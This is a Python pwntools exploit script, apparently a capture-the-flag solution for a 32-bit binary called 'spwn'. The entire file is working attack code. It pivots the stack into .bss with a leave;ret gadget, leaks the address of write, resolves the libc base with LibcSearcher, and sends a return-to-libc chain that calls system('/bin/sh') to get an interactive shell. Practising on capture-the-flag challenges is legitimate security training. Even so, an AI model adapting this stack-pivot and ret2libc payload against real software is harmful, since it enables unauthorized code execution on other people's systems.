from pwn import *
from LibcSearcher import *

r=process('./spwn')
#r=remote('node5.buuoj.cn',29061)
elf=ELF('./spwn')

write_plt=elf.plt['write']
write_got=elf.got['write']
main=0x8048513
s=0x0804A300
leave_ret=0x08048408

payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
r.recvuntil("What is your name?")
r.send(payload)

payload1=b'a'*0x18+p32(s-4)+p32(leave_ret)
r.recvuntil("What do you want to say?")
r.send(payload1)

write_addr=u32(r.recv(4))

libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
system=libc_base+libc.dump('system')
sh=libc_base+libc.dump('str_bin_sh')

r.recvuntil("name?")
payload=p32(system)+p32(0)+p32(sh)
r.sendline(payload)

r.recvuntil("say?")
r.sendline(payload1)

r.interactive()

